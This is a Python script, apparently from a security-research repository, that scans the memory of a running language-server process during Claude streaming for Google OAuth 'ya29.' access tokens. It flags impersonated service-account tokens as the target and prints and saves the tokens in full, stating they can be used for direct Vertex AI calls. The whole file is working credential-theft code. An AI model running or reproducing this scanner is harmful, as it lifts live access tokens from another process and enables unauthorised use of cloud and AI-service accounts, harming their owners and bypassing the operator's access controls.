#!/usr/bin/env python3
# PROOF: [L3/Utility] <- scripts/ A0→Implementation→v16b_mem_scanner
"""V16b-live: LS Process Memory Scanner for OAuth2 Tokens.

Scans /proc/PID/mem for 'ya29.' patterns during active Claude streaming.
Extracts impersonated access tokens that can be used for direct Vertex AI calls.

Usage:
    python3 v16b_mem_scanner.py <PID> [--continuous] [--output tokens.txt]
"""
import re
import sys
import time
import argparse
from pathlib import Path


# ya29. tokens are typically 100-300 chars of base64-ish content
TOKEN_PATTERN = re.compile(rb'ya29\.[A-Za-z0-9_-]{50,500}')

# Filter patterns - tokens we DON'T want (known non-impersonated)
KNOWN_OAUTH_PREFIXES = set()  # We'll collect and deduplicate


def scan_process_memory(pid: int) -> list[str]:
    """Scan /proc/PID/mem for ya29. tokens."""
    maps_path = Path(f"/proc/{pid}/maps")
    mem_path = Path(f"/proc/{pid}/mem")
    
    if not maps_path.exists():
        print(f"[ERROR] /proc/{pid}/maps not found — process dead?", file=sys.stderr)
        return []
    
    tokens = set()
    regions_scanned = 0
    bytes_scanned = 0
    
    try:
        with open(maps_path, 'r') as maps_file:
            regions = maps_file.readlines()
    except PermissionError:
        print(f"[ERROR] Cannot read /proc/{pid}/maps — permission denied", file=sys.stderr)
        return []
    
    try:
        mem = open(mem_path, 'rb')
    except PermissionError:
        print(f"[ERROR] Cannot open /proc/{pid}/mem — permission denied", file=sys.stderr)
        return []
    
    for line in regions:
        # Parse: start-end perms offset dev inode pathname
        parts = line.strip().split()
        if len(parts) < 2:
            continue
        
        perms = parts[1]
        # Only scan readable, writable regions (heap, anon mmap, stack)
        if 'r' not in perms:
            continue
        
        addr_range = parts[0].split('-')
        start = int(addr_range[0], 16)
        end = int(addr_range[1], 16)
        size = end - start
        
        # Skip very large regions (> 256MB) and tiny ones (< 4KB)
        if size > 256 * 1024 * 1024 or size < 4096:
            continue
        
        try:
            mem.seek(start)
            data = mem.read(size)
            bytes_scanned += len(data)
            regions_scanned += 1
            
            # Search for ya29. tokens
            for match in TOKEN_PATTERN.finditer(data):
                token = match.group().decode('ascii', errors='ignore')
                tokens.add(token)
                
        except (OSError, ValueError):
            # Region not readable (guard pages, etc.)
            continue
    
    mem.close()
    
    print(f"[INFO] Scanned {regions_scanned} regions, {bytes_scanned / 1024 / 1024:.1f} MB", 
          file=sys.stderr)
    
    return sorted(tokens)


def classify_tokens(tokens: list[str], known_user_token: str = "") -> dict:
    """Classify tokens into likely categories."""
    result = {
        "user_oauth": [],      # User's own OAuth token (known)
        "impersonated": [],    # SA impersonated token (target!)
        "unknown": [],         # Unclassified
    }
    
    for token in tokens:
        if known_user_token and token.startswith(known_user_token[:30]):
            result["user_oauth"].append(token)
        else:
            # All non-user tokens are potential impersonated tokens
            result["unknown"].append(token)
    
    return result


def main():
    parser = argparse.ArgumentParser(description="V16b-live: LS Memory Token Scanner")
    parser.add_argument("pid", type=int, help="LS process PID")
    parser.add_argument("--continuous", "-c", action="store_true",
                        help="Scan continuously every 0.5s for 30s")
    parser.add_argument("--output", "-o", type=str, default="",
                        help="Save unique tokens to file")
    parser.add_argument("--known-token", "-k", type=str, default="",
                        help="Known user OAuth token prefix (to filter out)")
    args = parser.parse_args()
    
    all_tokens = set()
    scan_count = 0
    
    if args.continuous:
        print(f"[V16b-live] Continuous scan of PID {args.pid} for 30s...", file=sys.stderr)
        end_time = time.time() + 30
        
        while time.time() < end_time:
            scan_count += 1
            tokens = scan_process_memory(args.pid)
            new_tokens = set(tokens) - all_tokens
            
            if new_tokens:
                print(f"\n[SCAN {scan_count}] {len(new_tokens)} NEW token(s) found!", file=sys.stderr)
                for t in sorted(new_tokens):
                    # Print first 80 chars for identification
                    print(f"  {t[:80]}...")
                all_tokens.update(new_tokens)
            else:
                print(f"[SCAN {scan_count}] No new tokens (total: {len(all_tokens)})", 
                      file=sys.stderr)
            
            time.sleep(0.5)
    else:
        tokens = scan_process_memory(args.pid)
        all_tokens.update(tokens)
    
    # Final report
    print(f"\n{'='*60}", file=sys.stderr)
    print(f"Total unique ya29.* tokens found: {len(all_tokens)}", file=sys.stderr)
    
    if all_tokens:
        classified = classify_tokens(sorted(all_tokens), args.known_token)
        
        print(f"\nUser OAuth: {len(classified['user_oauth'])}", file=sys.stderr)
        print(f"Unknown (potential impersonated): {len(classified['unknown'])}", file=sys.stderr)
        
        # Print all tokens to stdout
        for token in sorted(all_tokens):
            print(token)
        
        if args.output:
            with open(args.output, 'w') as f:
                for token in sorted(all_tokens):
                    f.write(token + '\n')
            print(f"\nTokens saved to: {args.output}", file=sys.stderr)
    else:
        print("No tokens found.", file=sys.stderr)


if __name__ == "__main__":
    main()
